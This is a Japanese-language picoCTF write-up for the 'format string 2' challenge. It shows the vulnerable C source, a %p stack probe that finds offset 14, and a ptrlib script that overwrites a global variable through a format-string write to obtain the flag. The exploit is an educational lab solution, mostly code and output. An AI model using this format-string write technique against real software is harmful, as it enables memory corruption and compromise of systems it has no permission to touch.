# format string 2:Binary Exploitation:200pts
This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must *change* data on the stack!  
Download the binary [here](vuln).  
Download the source [here](vuln.c).  
Connect with the challenge instance here:  
`nc rhea.picoctf.net 51885`  

Hints  
pwntools are very useful for this problem!  

# Solution
バイナリ、ソースと接続先が渡される。  
接続してみる。  
```bash
$ nc rhea.picoctf.net 51885
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
satoki
Here's your input: satoki
sus = 0x21737573
You can do better!

$ nc rhea.picoctf.net 51885
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
%s
Here's your input: Here's your input:
sus = 0x21737573
You can do better!
```
エコーバックがあり、fsbがあるようだ。  
ソースを見ると以下の通りであった。  
```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```
`0x21737573`である`sus`をfsbで`0x67616c66`に書き換えるとフラグが表示されるようだ。  
```bash
$ checksec --file=./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   42 Symbols        No    0               2               ./vuln
$ objdump -D ./vuln | grep '<sus>'
  401273:       8b 05 e7 2d 00 00       mov    0x2de7(%rip),%eax        # 404060 <sus>
  4012df:       8b 05 7b 2d 00 00       mov    0x2d7b(%rip),%eax        # 404060 <sus>
0000000000404060 <sus>:
```
PIEが無効なので、.data(`0x404060`)に乗っているグローバル変数を書き換えればよい。  
ptrlibには、自身の入力値が出てくる番目を指定すると自動でfsbをやってくれる機能がある。  
```bash
$ nc rhea.picoctf.net 51885
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,
Here's your input: 0x402075,(nil),0x7f0338bcda00,(nil),0xb362b0,0x7f0338c1faf0,0x7f0338bf64e8,0x9,0x7f0338bf6de9,0x7f03389c7098,0x7f0338be34d0,(nil),0x7ffedfcbf520,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,
sus = 0x21737573
You can do better!
```
`0x70252c70252c7025`は14番目のようだ。  
以下のfsb2.pyで行う。  
```python
from ptrlib import *

# sock = Process("./vuln")
sock = Socket("nc rhea.picoctf.net 51885")

payload = fsb(14, {0x404060: 0x67616C66}, bits=64)
sock.sendlineafter("say?\n", payload)

sock.sh()
```
実行する。  
```bash
$ python fsb2.py
[+] __init__: Successfully connected to rhea.picoctf.net:51885
~~~
I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{f0rm47_57r?_f0rm47_m3m_ccb55fce}
```
flagが表示された。  

## picoCTF{f0rm47_57r?_f0rm47_m3m_ccb55fce}